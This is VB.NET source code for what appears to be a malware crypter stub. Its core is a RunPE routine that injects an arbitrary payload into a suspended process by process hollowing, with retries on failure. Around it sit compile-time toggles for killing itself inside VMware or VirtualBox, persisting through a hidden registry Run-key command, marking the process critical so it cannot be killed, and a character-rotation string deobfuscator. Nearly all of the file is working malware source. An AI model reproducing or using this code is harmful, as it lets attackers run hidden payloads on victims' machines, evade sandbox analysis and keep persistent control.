
'-= Dll =-

'Option Explicit On
'Option Infer On
'Option Strict On

Public Class clsALL
    '%AntiSandboxie_Func%
    '%DeleteZoneID_Func%

    Public Shared Sub subALL(ByVal InjectionData As Byte())
        Try



            '%DeleteZoneID_Call%

            '%AntiSandboxie_Call%

            '%Anti_VM%      Dim VM001 As String = String.Empty
            '%Anti_VM%      For Each VM002 As System.Management.ManagementObject In New System.Management.ManagementObjectSearcher("root\CIMV2", "SELECT * FROM Win32_VideoController").Get
            '%Anti_VM%          VM001 = CStr(VM002.GetPropertyValue("Name"))
            '%Anti_VM%      Next
            '%Anti_VM%      If VM001.Contains("VMware") Or VM001.Contains("VirtualBox") Then
            '%Anti_VM%             System.Diagnostics.Process.GetCurrentProcess.Kill()
            '%Anti_VM%      End If

            System.Threading.Thread.Sleep(New System.Random().Next(1250, 2500))
            '%Delay%

            '%Hide_File%

            '%Process_Protection% 
            '%Process_Protection% ProtectProcess(0)

            clsRUNPE.injRun("%Injection_Path%", String.Empty, InjectionData, True)
            

            '%Startup%	Dim Path As String = "%folderpath%" & "\" & "%foldername%"
            '%Startup%	   Dim Filename As String = "%filename%.exe"
            '%Startup%	   Dim Key As String = "%registrykey%"
            '%Startup%	   If Not System.IO.File.Exists(Path & "\" & Filename) Then
            '%Startup%	       System.IO.Directory.CreateDirectory(Path)
            '%Startup%	       System.IO.File.Copy(System.Windows.Forms.Application.ExecutablePath, Path & "\" & Filename)
            '%Startup%	       Microsoft.VisualBasic.Interaction.Shell("REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V " & Microsoft.VisualBasic.Strings.Chr(34) & Key & Microsoft.VisualBasic.Strings.Chr(34) & " /t REG_SZ /F /D " & Microsoft.VisualBasic.Strings.Chr(34) & Path & "\" & Filename, Microsoft.VisualBasic.AppWinStyle.Hide)
            '%Startup%	   Else 'Re-Write registry key incase of delete
            '%Startup%	       Microsoft.VisualBasic.Interaction.Shell("REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V " & Microsoft.VisualBasic.Strings.Chr(34) & Key & Microsoft.VisualBasic.Strings.Chr(34) & " /t REG_SZ /F /D " & Microsoft.VisualBasic.Strings.Chr(34) & Path & "\" & Filename, Microsoft.VisualBasic.AppWinStyle.Hide)
            '%Startup%	   End If

        Catch EXCPTN As System.Exception
            System.Windows.Forms.MessageBox.Show("Error!" & System.Environment.NewLine & EXCPTN.ToString, System.Windows.Forms.Application.ProductName & " | Error!", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error)
        End Try
    End Sub

   

End Class

Public Class clsRUNPE
    '------------------
    'Creator: aeonhack
    'Site: elitevs.net
    'Created: 02/15/2013
    'Changed: 05/12/2013
    'Version: 1.0.0.7
    '------------------
#Region " API's & Structures "
    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="CreateProcess", CharSet:=System.Runtime.InteropServices.CharSet.Unicode), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function CreateProcess_API( _
    ByVal applicationName As String, _
    ByVal commandLine As String, _
    ByVal processAttributes As System.IntPtr, _
    ByVal threadAttributes As System.IntPtr, _
    ByVal inheritHandles As Boolean, _
    ByVal creationFlags As UInteger, _
    ByVal environment As System.IntPtr, _
    ByVal currentDirectory As String, _
    ByRef startupInfo As STARTUP_INFORMATION, _
    ByRef processInformation As PROCESS_INFORMATION) As Boolean
    End Function 'CreateProcess

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="GetThreadContext"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function GetThreadContext_API( _
    ByVal thread As System.IntPtr, _
    ByVal context As Integer()) As Boolean
    End Function 'GetThreadContext

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="Wow64GetThreadContext"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function Wow64GetThreadContext_API( _
    ByVal thread As System.IntPtr, _
    ByVal context As Integer()) As Boolean
    End Function 'Wow64GetThreadContext

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="SetThreadContext"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function SetThreadContext_API( _
    ByVal thread As System.IntPtr, _
    ByVal context As Integer()) As Boolean
    End Function 'SetThreadContext

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="Wow64SetThreadContext"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function Wow64SetThreadContext_API( _
    ByVal thread As System.IntPtr, _
    ByVal context As Integer()) As Boolean
    End Function 'Wow64SetThreadContext

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="ReadProcessMemory"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function ReadProcessMemory_API( _
    ByVal process As System.IntPtr, _
    ByVal baseAddress As Integer, _
    ByRef buffer As Integer, _
    ByVal bufferSize As Integer, _
    ByRef bytesRead As Integer) As Boolean
    End Function 'ReadProcessMemory

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="WriteProcessMemory"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function WriteProcessMemory_API( _
    ByVal process As System.IntPtr, _
    ByVal baseAddress As Integer, _
    ByVal buffer As Byte(), _
    ByVal bufferSize As Integer, _
    ByRef bytesWritten As Integer) As Boolean
    End Function 'WriteProcessMemory

    <System.Runtime.InteropServices.DllImport("ntdll.dll", EntryPoint:="NtUnmapViewOfSection"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function NtUnmapViewOfSection_API( _
    ByVal process As System.IntPtr, _
    ByVal baseAddress As Integer) As Integer
    End Function 'NtUnmapViewOfSection

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="VirtualAllocEx"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function VirtualAllocEx_API( _
    ByVal handle As System.IntPtr, _
    ByVal address As Integer, _
    ByVal length As Integer, _
    ByVal type As Integer, _
    ByVal protect As Integer) As Integer
    End Function 'VirtualAllocEx

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="ResumeThread"), System.Security.SuppressUnmanagedCodeSecurity> _
    Private Shared Function ResumeThread_API( _
    ByVal handle As System.IntPtr) As Integer
    End Function 'ResumeThread

    <System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack:=1)> _
    Private Structure PROCESS_INFORMATION
        Public ProcessHandle As System.IntPtr
        Public ThreadHandle As System.IntPtr
        Public ProcessId As UInteger
        Public ThreadId As UInteger
    End Structure 'PROCESS_INFORMATION

    <System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack:=1)> _
    Private Structure STARTUP_INFORMATION
        Public Size_ As UInteger
        Public Reserved1 As String
        Public Desktop As String
        Public Title As String

        Public dwX As Integer
        Public dwY As Integer
        Public dwXSize As Integer
        Public dwYSize As Integer
        Public dwXCountChars As Integer
        Public dwYCountChars As Integer
        Public dwFillAttribute As Integer
        Public dwFlags As Integer
        Public wShowWindow As Short
        Public cbReserved2 As Short
        Public Reserved2 As System.IntPtr
        Public StdInput As System.IntPtr
        Public StdOutput As System.IntPtr
        Public StdError As System.IntPtr
    End Structure 'STARTUP_INFORMATION
#End Region
    Public Shared Function injRun(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
        For fri As Integer = 1 To 5
            If HandleRun(path, cmd, data, compatible) Then Return True
        Next

        Return False
    End Function 'Run
    Private Shared Function HandleRun(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
        Dim ReadWrite As Integer
        Dim QuotedPath As String = String.Format("""{0}""", path)

        Dim SI As New STARTUP_INFORMATION
        Dim PI As New PROCESS_INFORMATION

        SI.dwFlags = 0 ' dwFlags = 1 ( Hide ) ' dwFlags = 0 ( Show )
        SI.Size_ = CUInt(System.Runtime.InteropServices.Marshal.SizeOf(GetType(STARTUP_INFORMATION)))

        Try
            If Not String.IsNullOrEmpty(cmd) Then
                QuotedPath = QuotedPath & " " & cmd
            End If

            If Not CreateProcess_API(path, QuotedPath, System.IntPtr.Zero, System.IntPtr.Zero, False, 4, System.IntPtr.Zero, Nothing, SI, PI) Then Throw New System.Exception()

            '%Process_Protection% ProtectProcess(PI.ProcessId)

            Dim FileAddress As Integer = System.BitConverter.ToInt32(data, 60)
            Dim ImageBase As Integer = System.BitConverter.ToInt32(data, FileAddress + 52)

            Dim Context_(179 - 1) As Integer
            Context_(0) = 65538

            If System.IntPtr.Size = 4 Then
                If Not GetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New System.Exception()
            Else
                If Not Wow64GetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New System.Exception()
            End If

            Dim Ebx As Integer = Context_(41)
            Dim BaseAddress As Integer

            If Not ReadProcessMemory_API(PI.ProcessHandle, Ebx + 8, BaseAddress, 4, ReadWrite) Then Throw New System.Exception()

            If ImageBase = BaseAddress Then
                If Not NtUnmapViewOfSection_API(PI.ProcessHandle, BaseAddress) = 0 Then Throw New System.Exception()
            End If

            Dim SizeOfImage As Integer = System.BitConverter.ToInt32(data, FileAddress + 80)
            Dim SizeOfHeaders As Integer = System.BitConverter.ToInt32(data, FileAddress + 84)

            Dim AllowOverride As Boolean
            Dim NewImageBase As Integer = VirtualAllocEx_API(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64) 'R1

            'This is the only way to execute under certain conditions. However, it may show
            'an application error probably because things aren't being relocated properly.

            If Not compatible AndAlso NewImageBase = 0 Then
                AllowOverride = True
                NewImageBase = VirtualAllocEx_API(PI.ProcessHandle, 0, SizeOfImage, 12288, 64)
            End If

            If NewImageBase = 0 Then Throw New System.Exception()

            If Not WriteProcessMemory_API(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ReadWrite) Then Throw New System.Exception()

            Dim SectionOffset As Integer = FileAddress + 248
            Dim NumberOfSections As Short = System.BitConverter.ToInt16(data, FileAddress + 6)

            For fri As Integer = 0 To NumberOfSections - 1
                Dim VirtualAddress As Integer = System.BitConverter.ToInt32(data, SectionOffset + 12)
                Dim SizeOfRawData As Integer = System.BitConverter.ToInt32(data, SectionOffset + 16)
                Dim PointerToRawData As Integer = System.BitConverter.ToInt32(data, SectionOffset + 20)

                If Not SizeOfRawData = 0 Then
                    Dim SectionData(SizeOfRawData - 1) As Byte
                    System.Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length)

                    If Not WriteProcessMemory_API(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New System.Exception()
                End If

                SectionOffset += 40
            Next

            Dim PointerData As Byte() = System.BitConverter.GetBytes(NewImageBase)
            If Not WriteProcessMemory_API(PI.ProcessHandle, Ebx + 8, PointerData, 4, ReadWrite) Then Throw New System.Exception()

            Dim AddressOfEntryPoint As Integer = System.BitConverter.ToInt32(data, FileAddress + 40)

            If AllowOverride Then NewImageBase = ImageBase
            Context_(44) = NewImageBase + AddressOfEntryPoint

            If System.IntPtr.Size = 4 Then
                If Not SetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New System.Exception()
            Else
                If Not Wow64SetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New System.Exception()
            End If

            If ResumeThread_API(PI.ThreadHandle) = -1 Then Throw New System.Exception()
        Catch
            Dim Pros As System.Diagnostics.Process = System.Diagnostics.Process.GetProcessById(CInt(PI.ProcessId))
            If Pros IsNot Nothing Then Pros.Kill()

            Return False
        End Try

        Return True
    End Function 'HandleRun
End Class ' RunPE

#Region " Process Protection ( Removed, added on compile ) "
'%Process_Protection%	    <DllImport("kernel32.dll", EntryPoint:="GetCurrentProcess"), SuppressUnmanagedCodeSecurity> _
'%Process_Protection%	Private Shared Function GetCurrentProcess() As IntPtr
'%Process_Protection%	End Function



'%Process_Protection%	<DllImport("ntdll.dll", EntryPoint:="ZwSetInformationProcess"), SuppressUnmanagedCodeSecurity> _
'%Process_Protection%	Private Shared Sub ZwSetInformationProcess( _
'%Process_Protection%	        ByVal Handle As Integer, _
'%Process_Protection%	       ByVal ProcessIOPriority As Integer, _
'%Process_Protection%	       ByRef SignedValue As Integer, _
'%Process_Protection%	       ByVal ProcessInformationLenght As Integer)
'%Process_Protection%	End Sub
'%Process_Protection%	<DllImport("kernel32.dll")> _
'%Process_Protection%	Public Shared Function OpenProcess(processAccess As Integer, bInheritHandle As Boolean, processId As Integer) As IntPtr
'%Process_Protection%	 Function
'%Process_Protection%	Public Shared Sub ProtectProcess(PID As Integer)
'%Process_Protection%	Dim aaaaaaaaaaaaaaa As UInteger = 2147545385
'%Process_Protection%	    If PID = 0 Then
'%Process_Protection%	        ZwSetInformationProcess(GetCurrentProcess(), 33, aaaaaaaaaaaaaaa, 4)
'%Process_Protection%	    Else
'%Process_Protection%	       ZwSetInformationProcess(OpenProcess(512, True, PID), 33, aaaaaaaaaaaaaaa, 4)
'%Process_Protection%	    End If


'%Process_Protection%	End Sub
#End Region

Public Class clsDEROTATE
    Public Shared Function funcDEROTATE(strinput As String) As String
        For derot1 As Integer = 1 To Microsoft.VisualBasic.Len(strinput)
            Mid(strinput, derot1, 1) = Microsoft.VisualBasic.ChrW(Microsoft.VisualBasic.AscW(Microsoft.VisualBasic.Strings.Mid(strinput, derot1, 1)) - 420)
        Next derot1
        Return strinput
    End Function
End Class ' De-Rotation

